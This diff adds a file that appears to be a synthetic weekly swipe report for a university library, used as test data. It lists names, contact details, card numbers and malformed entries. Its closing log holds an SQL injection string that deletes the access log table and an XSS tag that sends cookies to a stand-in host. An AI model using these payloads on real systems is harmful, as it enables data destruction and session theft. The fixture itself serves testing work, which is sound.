@@ -1,0 +1,176 @@
+ALU LIBRARY & LAB ACCESS SYSTEM
+DAILY SWIPE REPORT
+Range: 2026-09-08 to 2026-09-14
+
+--------------------------------------------------
+MON 2026-09-08
+--------------------------------------------------
+
+>> 06:58:03 | CHECK-IN | Name: Moses Byiringiro
+   Email: moses.byiringiro@si.alueducation.com
+   Tel: +250788214903
+   Location: Main Library
+   Result: OK
+
+>> 07:22:41 | CHECK-IN | Name: Christella Umutoni
+   Email: christella.umutoni@alueducation.com
+   Tel: +250722871004
+   Location: Main Library
+   Result: OK
+
+>> 08:03:15 | CHECK-IN | Name: Faycal Nkurunziza
+   Email: fnkurunziza@hotmail.com
+   Tel: +250733882451
+   Location: Computer Lab 2
+   Result: OK
+
+--------------------------------------------------
+TUE 2026-09-09
+--------------------------------------------------
+
+>> 07:14:29 | CHECK-IN | Name: Ines Iradukunda
+   Email: ines.iradukunda@alumni.alueducation.com
+   Tel: +250789004556
+   Location: Main Library
+   Result: OK
+
+>> 09:40:02 | CHECK-IN | Name: Bosco Sibomana
+   Email: bosco.sibomana@si.alueducation.com
+   Tel: +250788213674
+   Location: Computer Lab 1
+   Result: OK
+
+>> 12:11:56 | CHECK-IN | Name: Unregistered Guest
+   Email: guest_user##bad*email
+   Tel: +250-XX-000-111
+   Location: Main Library
+   Result: DENIED
+
+--------------------------------------------------
+WED 2026-09-10
+--------------------------------------------------
+
+>> 06:47:33 | CHECK-IN | Name: Rachel Umuhoza
+   Email: rachel.umuhoza@alueducation.com
+   Tel: +250733009887
+   Location: Main Library
+   Result: OK
+
+>> 08:29:18 | CHECK-IN | Name: Yves Ntwali
+   Email: yves.ntwali@si.alueducation.com
+   Tel: +250722456810
+   Location: Computer Lab 2
+   Result: OK
+
+>> 13:52:47 | CHECK-IN | Name: Clarisse Mahoro
+   Email: clarisse.mahoro@gmail.com
+   Tel: +250789002214
+   Location: Main Library
+   Result: OK
+
+--------------------------------------------------
+WED 2026-09-10 - LAB EQUIPMENT DEPOSITS
+--------------------------------------------------
+
+>> 15:30:09 | DEPOSIT HOLD | Name: Yves Ntwali
+   Email: yves.ntwali@si.alueducation.com
+   Tel: +250722456810
+   Purpose: Laptop loan deposit - Computer Lab 2
+   Card Number: 5399939999999393
+   Amount: RWF 25,000
+   Result: HOLD PLACED
+
+>> 16:02:53 | DEPOSIT HOLD | Name: Rachel Umuhoza
+   Email: rachel.umuhoza@alueducation.com
+   Tel: +250733009887
+   Purpose: Projector loan deposit - Main Library
+   Card Number: 4485 0912 3345 7712
+   Amount: RWF 40,000
+   Result: HOLD PLACED
+
+--------------------------------------------------
+THU 2026-09-11
+--------------------------------------------------
+
+>> 07:09:24 | CHECK-IN | Name: Divine Keza
+   Email: divine.keza@alueducation.com
+   Tel: +250782330441
+   Location: Main Library
+   Result: OK
+
+>> 10:44:37 | CHECK-IN | Name: Placide Ndayisenga
+   Email: placide.ndayisenga@si.alueducation.com
+   Tel: +250791220998
+   Location: Computer Lab 1
+   Result: OK
+
+Library opening hours today: 06:30 - 21:00
+Late-night study room closes at 11:45 PM
+
+--------------------------------------------------
+FRI 2026-09-12
+--------------------------------------------------
+
+>> 06:51:12 | CHECK-IN | Name: Josiane Mukandayisenga
+   Email: josiane.mukandayisenga@alumni.alueducation.com
+   Tel: +250788900231
+   Location: Main Library
+   Result: OK
+
+>> 09:18:05 | CHECK-IN | Name: Fabrice Uwizeyimana
+   Email: fabrice.uwizeyimana@alueducation.com
+   Tel: +250733118204
+   Location: Computer Lab 2
+   Result: OK
+
+>> 14:37:59 | CHECK-IN | Name: No ID Presented
+   Email: badformat@@alueducation..com
+   Tel: n/a
+   Location: Main Library
+   Result: DENIED
+
+--------------------------------------------------
+SAT 2026-09-13
+--------------------------------------------------
+>> 08:22:16 | CHECK-IN | Name: Solange Ishimwe
+   Email: solange.ishimwe@si.alueducation.com
+   Tel: +250782556903
+   Location: Main Library
+   Result: OK
+
+Weekend security patrol scheduled for 2:15 pm and again at 9:00pm
+
+--------------------------------------------------
+SUN 2026-09-14
+--------------------------------------------------
+
+>> 09:05:44 | CHECK-IN | Name: Moses Byiringiro
+   Email: moses.byiringiro@si.alueducation.com
+   Tel: +250788214903
+   Location: Main Library
+   Result: OK
+
+>> 11:26:38 | CHECK-IN | Name: Christella Umutoni
+   Email: christella.umutoni@alueducation.com
+   Tel: +250722871004
+   Location: Computer Lab 1
+   Result: OK
+
+Faulty scanner time entry: 25:61
+Another glitch entry: 13:75 PM
+Broken phone entry: +250-**-????
+
+--------------------------------------------------
+SYSTEM MESSAGE LOG
+--------------------------------------------------
+
+Midnight security round logged at 00:15
+Shift handover logged at 12:00 PM
+
+Inbound message from external device #48:
+"' OR '1'='1'; DELETE FROM access_logs; --"
+
+Inbound message from external device #52:
+<img src=x onerror="fetch('http://data-collector.example/leak?c='+document.cookie)">
+
+-- end of weekly report --
